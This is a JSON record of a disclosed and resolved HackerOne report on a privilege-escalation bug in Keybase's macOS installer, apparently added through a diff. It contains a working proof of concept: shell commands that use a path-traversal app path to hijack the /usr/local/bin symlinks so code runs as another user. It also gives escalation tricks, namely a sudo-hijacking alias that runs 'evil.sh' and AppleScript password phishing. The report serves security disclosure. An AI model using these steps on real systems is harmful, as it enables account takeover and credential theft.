@@ -1,0 +1,125 @@
+{
+  "id": 485407,
+  "global_id": "Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC80ODU0MDc=",
+  "url": "https://hackerone.com/reports/485407",
+  "title": "From nobody to somebody",
+  "state": "Closed",
+  "substate": "resolved",
+  "severity_rating": "medium",
+  "readable_substate": "Resolved",
+  "created_at": "2019-01-24T16:33:15.416Z",
+  "submitted_at": "2019-01-24T16:33:15.416Z",
+  "is_member_of_team?": false,
+  "is_organization_group_member?": false,
+  "reporter": {
+    "disabled": false,
+    "username": "u3mur4",
+    "url": "/u3mur4",
+    "profile_picture_urls": {
+      "small": "https://profile-photos.hackerone-user-content.com/variants/000/449/470/1f5148d87050c9c48970956ff5160260dcd451c2_original.png/d3dc6b2d7e2dc3657e8861b0d7e2dfca1a6d513dd784c613f4e56738907cea98"
+    },
+    "is_me?": false,
+    "cleared": false,
+    "verified": false,
+    "hackerone_triager": false,
+    "hacker_mediation": false
+  },
+  "team": {
+    "id": 2809,
+    "url": "https://hackerone.com/keybase",
+    "handle": "keybase",
+    "profile_picture_urls": {
+      "small": "https://profile-photos.hackerone-user-content.com/variants/000/002/809/710eb42880bb34c06cab0d1d5081488ec59aec5e_original.png/d3dc6b2d7e2dc3657e8861b0d7e2dfca1a6d513dd784c613f4e56738907cea98",
+      "medium": "https://profile-photos.hackerone-user-content.com/variants/000/002/809/710eb42880bb34c06cab0d1d5081488ec59aec5e_original.png/5136ed9b2fa7c4d4abbf39fb971047c62d98ec4740a88eb55d7e26373250a937"
+    },
+    "permissions": [],
+    "submission_state": "paused",
+    "default_currency": "usd",
+    "awards_miles": false,
+    "offers_bounties": true,
+    "state": "public_mode",
+    "only_cleared_hackers": false,
+    "pentest_feature_enabled?": false,
+    "profile": {
+      "name": "Keybase",
+      "twitter_handle": "keybaseio",
+      "website": "https://keybase.io",
+      "about": ""
+    }
+  },
+  "has_bounty?": true,
+  "in_validation?": false,
+  "can_view_team": true,
+  "can_view_report": true,
+  "is_external_bug": false,
+  "is_published": false,
+  "is_participant": false,
+  "has_collaborators": false,
+  "submitted_by_team_member": false,
+  "stage": 4,
+  "public": true,
+  "visibility": "full",
+  "cve_ids": [],
+  "singular_disclosure_disabled": true,
+  "disclosed_at": "2020-01-24T23:20:20.068Z",
+  "bug_reporter_agreed_on_going_public_at": "2020-01-23T07:12:52.130Z",
+  "team_member_agreed_on_going_public_at": "2020-01-24T23:20:19.940Z",
+  "comments_closed?": false,
+  "facebook_team?": false,
+  "team_private?": false,
+  "vulnerability_information": "# Short description\n\nUsing a bug any user can change the `keybase` and `git-remote-keybase` symlinks in the `/usr/locale/bin` folder. We can exploit this to run arbitrary code as the user.\n\n# Steps to reproduce\n1. In the example I will use the low privileged `nobody` account (could be any other account) and I will target the `u3mur4` admin user.\n```bash\n➜ ~ sudo -u nobody bash\nPassword:\nbash-3.2$ id\nuid=4294967294(nobody) gid=4294967294(nobody) groups=4294967294(nobody),12(everyone),61(localaccounts),702(2),701(1),100(_lpoperator)\nbash-3.2$\n```\n\n2.  Create the `/var/tmp/poc/Contents/SharedSupport/bin` folder structure with 2 symlinks which are pointing to the original `keybase` and `git-remote-keybase` binaries.\n```bash\nbash-3.2$ mkdir -p /var/tmp/poc/Contents/SharedSupport/bin\nbash-3.2$ cd /var/tmp/poc/Contents/SharedSupport/bin\nbash-3.2$ ln -s /Applications/Keybase.app/Contents/SharedSupport/bin/keybase keybase\nbash-3.2$ ln -s /Applications/Keybase.app/Contents/SharedSupport/bin/git-remote-keybase git-remote-keybase\nbash-3.2$ ls -lah .\ntotal 16\ndrwxr-xr-x  4 nobody  wheel   136B Jan 24 03:31 .\ndrwxr-xr-x  3 nobody  wheel   102B Jan 24 03:30 ..\nlrwxr-xr-x  1 nobody  wheel    71B Jan 24 03:31 git-remote-keybase -> /Applications/Keybase.app/Contents/SharedSupport/bin/git-remote-keybase\nlrwxr-xr-x  1 nobody  wheel    60B Jan 24 03:31 keybase -> /Applications/Keybase.app/Contents/SharedSupport/bin/keybase\nbash-3.2$\n```\n> The `nobody` user has write permission to `/var/tmp` directory and content of the directory is preserved between reboots. \n\n3. Run the keybase installer command with `--app-path=/Applications/Keybase.app/../../var/tmp/poc` and the `install-cli` flag.\n```bash\nbash-3.2$ /Applications/Keybase.app/Contents/Resources/KeybaseInstaller.app/Contents/MacOS/Keybase --run-mode=prod --timeout=10 --debug --app-path=/Applications/Keybase.app/../../var/tmp/poc --install-cli\n[REMOVED]\n01.24.2019 03:39:54.411 KBCommandLine:38[DEBG] Helper: addToPath({\n    appName = Keybase;\n    directory = \"/Applications/Keybase.app/../../var/tmp/poc/Contents/SharedSupport/bin\";\n    name = keybase;\n})\n01.24.2019 03:39:54.414 KBCommandLine:40[DEBG] Result: {\n    path = \"/usr/local/bin/keybase\";\n}\n01.24.2019 03:39:54.414 KBCommandLine:47[DEBG] Helper: addToPath({\n    appName = Keybase;\n    directory = \"/Applications/Keybase.app/../../var/tmp/poc/Contents/SharedSupport/bin\";\n    name = \"git-remote-keybase\";\n})\n01.24.2019 03:39:54.419 KBCommandLine:49[DEBG] Result: {\n    path = \"/usr/local/bin/git-remote-keybase\";\n}\n01.24.2019 03:39:54.419 KBCommandLine:131[INFO] Link resolved to path: /Applications/Keybase.app/../../var/tmp/poc/Contents/SharedSupport/bin/keybase <=> /Applications/Keybase.app/../../var/tmp/poc/Contents/SharedSupport/bin/keybase\n01.24.2019 03:39:54.419 KBInstaller:45[INFO] Install complete\n[REMOVED]\nbash-3.2$\n```\n\n4. Check that in the `/usr/local/bin` folder the `keybase` and `git-remote-keybase` links are changed to our specified links.\n```bash\nbash-3.2$ ls -lah /usr/local/bin/\ntotal 80\ndrwxrwxr-x  12 u3mur4  admin   408B Jan 24 02:44 .\ndrwxr-xr-x  15 root    wheel   510B Jan 16 07:33 ..\nlrwxr-xr-x   1 u3mur4  admin    28B Jan 16 05:32 brew -> /usr/local/Homebrew/bin/brew\n-rwxr-xr-x   1 root    admin   538B Jan 16 06:30 fuzzy_match\nlrwxr-xr-x   1 u3mur4  admin    89B Jan 24 02:44 git-remote-keybase -> /Applications/Keybase.app/../../var/tmp/poc/Contents/SharedSupport/bin/git-remote-keybase\nlrwxr-xr-x   1 u3mur4  admin    29B Jan 16 05:44 htop -> ../Cellar/htop/2.2.0/bin/htop\nlrwxr-xr-x   1 u3mur4  admin    78B Jan 24 02:44 keybase -> /Applications/Keybase.app/../../var/tmp/poc/Contents/SharedSupport/bin/keybase\n-rwxr-xr-x   1 root    admin   526B Jan 16 06:30 pod\n-rwxr-xr-x   1 root    admin   534B Jan 16 06:30 sandbox-pod\n-rwxr-xr-x   1 root    admin   532B Jan 16 06:30 xcodeproj\nlrwxr-xr-x   1 u3mur4  admin    29B Jan 23 22:42 zsh -> ../Cellar/zsh/5.6.2_1/bin/zsh\nlrwxr-xr-x   1 u3mur4  admin    35B Jan 23 22:42 zsh-5.6.2 -> ../Cellar/zsh/5.6.2_1/bin/zsh-5.6.2\n```\n> Notice that the `nobody` account has no permission the change these links directly.\n\n5. Remove our links in the `/var/tmp/poc/Contents/SharedSupport/bin/` folder and create some executable files. In the example I will just simply use the `id` command and I forward the flags to the original binaries.\n```bash\nbash-3.2$ ls\ngit-remote-keybase\tkeybase\nbash-3.2$ rm keybase git-remote-keybase\nbash-3.2$ cat <<EOF >> keybase\n#!/bin/bash\nid >> /tmp/out\n/Applications/Keybase.app/Contents/SharedSupport/bin/keybase \\$@\nEOF\nbash-3.2$ cat <<EOF >> git-remote-keybase\n#!/bin/bash\nid >> /tmp/out\n/Applications/Keybase.app/Contents/SharedSupport/bin/git-remote-keybase \\$@\nEOF\nbash-3.2$ chmod +x keybase git-remote-keybase\n```\n\n6. Wait until the `u3mur4` account using the `git clone keybase://` or the `keybase` command.\n```bash\n➜  ~ id\nuid=501(u3mur4) gid=20(staff) groups=20(staff),12(everyone),61(localaccounts),79(_appserverusr),80(admin),81(_appserveradm),98(_lpadmin),702(2),701(1),33(_appstore),100(_lpoperator),204(_developer),250(_analyticsusers),395(com.apple.access_ftp),398(com.apple.access_screensharing),399(com.apple.access_ssh)\n➜  ~ keybase\nNAME:\n   keybase - Keybase command line client.\n[REMOVED]\n```\nCheck the `/tmp/out` file. \n```bash\nbash-3.2$ cat /tmp/out\nuid=501(u3mur4) gid=20(staff) groups=20(staff),12(everyone),61(localaccounts),79(_appserverusr),80(admin),81(_appserveradm),98(_lpadmin),702(2),701(1),33(_appstore),100(_lpoperator),204(_developer),250(_analyticsusers),395(com.apple.access_ftp),398(com.apple.access_screensharing),399(com.apple.access_ssh)\nbash-3.2$\n```\n> Notice that the `u3mur4` account executed our binary because we could change the symlinks in the `/usr/local/bin` directory. From now on we can access any file and run arbitrary command as the targeted account. Also we can access the `private` keybase folder of the user and other sensitive data.\n\n7. How to become root?\n\nBecause we can run arbitrary code as the targeted user we have multiple ways to achieve root privileges. By using misconfigurations with a little bit of social engineering you can get your victim to escalate you to root without realizing it.\n\n-  By adding this line to the users .bash_profile: `alias sudo='sudo sh -c '\\''evil.sh & exec \"$@\"'\\'' sh'`. We can change the behavior of what happens when the user runs “sudo”.\n\n- AppleScript is fairly simple, and can be used to phish for passwords for nearly anything.  If you can acquire the password of an administrator user, you can escalate to root. So when the user runs the keybase binary we can create a popup that the 'keybase helper need to update...' and the user have to enter the password.\n\n- This will work up until El Capitan: The sudoers policy caches credentials for 5 minutes, unless overridden in sudoers(5). What this means is that once a user runs sudo, they can run a command with sudo again for up to 5 minutes without having to enter their password again.\n\n- Short version (see source 2): Homebrew changes the permissions on `/usr/local/bin` to the user (or any process running as the user) is able to write files to it and give those files executable permissions. Now if you (or someone else, or some other program) were to place a program called sudo in /usr/local/bin, then every time you typed sudo it would be that program that would be executed, not the real one.\n\n- etc...\n\n[source1 - privilege-escalation-on-os-x-without-exploits](https://www.n00py.io/2016/10/privilege-escalation-on-os-x-without-exploits/)\n\n[source2 - how-homebrew-invites-users-to-get-pwned](https://applehelpwriter.com/2018/03/21/how-homebrew-invites-users-to-get-pwned/)\n\n# Why can we change the symlinks? \n> **the 3th item is the most important**\n\n1. \nIn the [client/osx/Installer/Options.m:125](https://github.com/keybase/client/blob/master/osx/Installer/Options.m#L125) file\n```\nNSString *servicePath = [self.appPath stringByAppendingPathComponent:@\"Contents/SharedSupport/bin\"];\n```\nthe code appends the `Contents/SharedSupport/bin` path to the specified appPath. We specified appPath in step 2 as `/Applications/Keybase.app/../../var/tmp/poc`. After appending the path, the servicePath becomes `/Applications/Keybase.app/../../var/tmp/poc/Contents/SharedSupport/bin` which resolves to `/var/tmp/poc/Contents/SharedSupport/bin`. That is why we created the directory structure specified in step 2.\n\n2. In the [client/osx/KBKit/KBKit/Component/KBCommandLine.m:26](https://github.com/keybase/client/blob/master/osx/KBKit/KBKit/Component/KBCommandLine.m#L26) file\n```\n...\n  if (![self.config isInApplications:self.servicePath]) {\n    completion(KBMakeWarning(@\"Command line install is not supported from this location: %@\", self.servicePath));\n    return;\n  }\n...\n```\nthe code checks that the servicePath start with `/Application`. That is why we specify the `/Application...` appPath with the `../..` components in step 3.\n\n3. In the [client/osx/Helper/KBHelper.m:371](https://github.com/keybase/client/blob/master/osx/Helper/KBHelper.m#L371) file the `install` function will call the [checkAbsolutePath](https://github.com/keybase/client/blob/master/osx/Helper/fs.m#L71-L91) function with `path=/Applications/Keybase.app/../../var/tmp/poc/Contents/SharedSupport/bin/keybase` and `prefix=/Applications/Keybase.app` arguments.\n```\n/*\n * check that the path path has the prefix prefix, being wise to\n * whatever attacks people will throw at us, like /a/b/../../.., etc\n */\n+(BOOL)checkAbsolutePath:(NSString *)path hasAbsolutePrefix:(NSString *)prefix {\n    if (!prefix.absolutePath) {\n        return NO;\n    }\n    if (!path.absolutePath) {\n        return NO;\n    }\n    NSArray *a = [path.stringByStandardizingPath componentsSeparatedByString:@\"/\"];\n    NSArray *b = [prefix.stringByStandardizingPath componentsSeparatedByString:@\"/\"];\n    if (a.count < b.count) {\n        return NO;\n    }\n\n    for (int i = 0; i < b.count; i++) {\n        if (![a[i] isEqualToString:b[i]]) {\n            return NO;\n        }\n    }\n    return YES;\n}\n```\nThe `a` (path) array becomes `[\"\", Application, \"Keybase.app\", Contents, SharedSupport, bin, keybase]`. **So the stringByStandardizingPath function will resolves the /Applications/Keybase.app/../../var/tmp/poc/Contents/SharedSupport/bin/keybase link** that is why it will start as the b `[\"\", Application, \"Keybase.app\"]` array. The function will return `YES` and the add `addToPath` function will create the link.\n\n4. In the [client/osx/KBKit/KBKit/Component/KBCommandLine.m:125-137](https://github.com/keybase/client/blob/master/osx/KBKit/KBKit/Component/KBCommandLine.m#L125-L137) file\n```\n- (BOOL)linkedToServicePath {\n  NSString *linkDir = @\"/usr/local/bin\";\n  NSString *linkPath = [NSString stringWithFormat:@\"%@/%@\", linkDir, self.config.serviceBinName];\n  NSString *shouldResolveToPath = [NSString stringWithFormat:@\"%@/%@\", self.servicePath, self.config.serviceBinName];\n  if ([NSFileManager.defaultManager fileExistsAtPath:linkDir]) {\n    NSString *resolved = [self resolveLinkPath:linkPath];\n    DDLogInfo(@\"Link resolved to path: %@ <=> %@\", resolved, shouldResolveToPath);\n    if ([resolved isEqualToString:shouldResolveToPath]) {\n      return YES;\n    }\n  }\n  return NO;\n}\n```\nthe code checks that `/usr/local/bin` + `serviceBinName` link resolves to the same place as our specified `servicePath` (appPath + Contents/SharedSupport/bin) + `serviceBinName`. That is why we created two symlink to the original binaries in step 2.\n\n> Notice that we have permission to remove, modify later this link, (in step 4 and 5).\n\n## Impact\n\nUnauthorized access is possible which impacts the confidentially, integrity, and availability of the system.",
+  "weakness": {
+    "id": 75,
+    "name": "Privilege Escalation"
+  },
+  "original_report_id": null,
+  "original_report_url": null,
+  "attachments": [],
+  "allow_singular_disclosure_at": null,
+  "vote_count": 47,
+  "voters": [
+    "superhero1",
+    "base_64",
+    "rook1337",
+    "u3mur4",
+    "7yr",
+    "andi",
+    "ali",
+    "icanthack",
+    "mehdisadir",
+    "metnew",
+    "and 37 more..."
+  ],
+  "severity": {
+    "rating": "medium",
+    "score": 6.1,
+    "author_type": "Team",
+    "metrics": {
+      "attack_vector": "local",
+      "attack_complexity": "low",
+      "privileges_required": "none",
+      "user_interaction": "required",
+      "scope": "changed",
+      "confidentiality": "low",
+      "integrity": "low",
+      "availability": "low"
+    }
+  },
+  "structured_scope": null,
+  "abilities": {
+    "assignable_team_members": [],
+    "assignable_team_member_groups": []
+  },
+  "summaries": [
+    {
+      "category": "team",
+      "can_view?": true,
+      "can_create?": false
+    },
+    {
+      "category": "researcher",
+      "can_view?": true,
+      "can_create?": false
+    }
+  ]
+}
